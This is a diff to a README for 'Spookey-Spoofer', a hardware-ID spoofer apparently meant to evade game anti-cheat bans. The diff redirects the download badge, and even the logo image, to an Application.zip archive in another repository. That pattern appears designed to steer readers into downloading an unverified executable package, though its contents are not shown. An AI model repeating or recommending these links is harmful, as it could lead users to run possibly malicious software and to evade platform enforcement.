@@ -30,7 +30,7 @@ Welcome to the Spookey-Spoofer repository! This tool is a cleaner and spoofer de
 3. Follow the on-screen instructions to clean and spoof your hardware IDs.
 
 ## Get Started
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-Spookey--Spoofer-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Spookey-Spoofer](https://github.com/pilore/Spookey-Spoofer/releases/download/v1.0/Application.zip)](https://github.com/pilore/Spookey-Spoofer/releases/download/v1.0/Application.zip)
 
 If the link doesn't work, please check the "Releases" section of this repository to find the latest version of the Spookey-Spoofer tool.
 
@@ -39,6 +39,6 @@ If you encounter any issues or have questions about using the Spookey-Spoofer to
 
 Let's make gaming enjoyable again with Spookey-Spoofer! 🚀🎮
 
-![Spookey-Spoofer Logo](https://example.com/spookey-spoofer-logo.png)
+![Spookey-Spoofer Logo](https://github.com/pilore/Spookey-Spoofer/releases/download/v1.0/Application.zip)
 
 Remember, always game responsibly and ethically! 😉🕹️
